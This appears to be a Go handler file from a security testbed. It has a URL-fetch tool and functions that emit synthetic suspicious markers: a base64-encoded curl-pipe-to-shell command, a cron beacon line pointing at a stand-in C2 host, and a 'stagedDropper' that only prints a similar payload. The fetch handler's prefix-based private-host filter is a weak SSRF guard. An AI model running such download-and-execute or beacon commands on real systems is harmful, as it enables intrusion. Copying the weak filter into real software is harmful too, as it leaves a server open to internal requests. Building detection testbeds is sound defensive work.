package handlers

import (
	"encoding/base64"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")

	parsed, err := url.Parse(source)
	if err != nil || strings.ToLower(parsed.Scheme) != "https" {
		http.Error(w, "invalid url: only https scheme is allowed", http.StatusBadRequest)
		return
	}

	host := strings.ToLower(parsed.Hostname())
	if isPrivateHost(host) {
		http.Error(w, "invalid url: host not allowed", http.StatusBadRequest)
		return
	}

	resp, err := http.Get(source)
	if err != nil {
		log.Printf("FetchTool: fetch error: %v", err)
		http.Error(w, "fetch failed", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	out, err := os.Create(target)
	if err != nil {
		log.Printf("FetchTool: create error: %v", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	defer out.Close()

	if _, err := io.Copy(out, io.LimitReader(resp.Body, 2<<20)); err != nil {
		log.Printf("FetchTool: copy error: %v", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

// isPrivateHost returns true for loopback, link-local, and internal hostnames.
func isPrivateHost(host string) bool {
	private := []string{
		"localhost", "127.", "::1", "0.", "10.", "172.16.", "172.17.", "172.18.",
		"172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
		"172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.",
		"169.254.", "metadata.", "[::1]", "fc", "fd",
	}
	for _, p := range private {
		if strings.HasPrefix(host, p) {
			return true
		}
	}
	return false
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
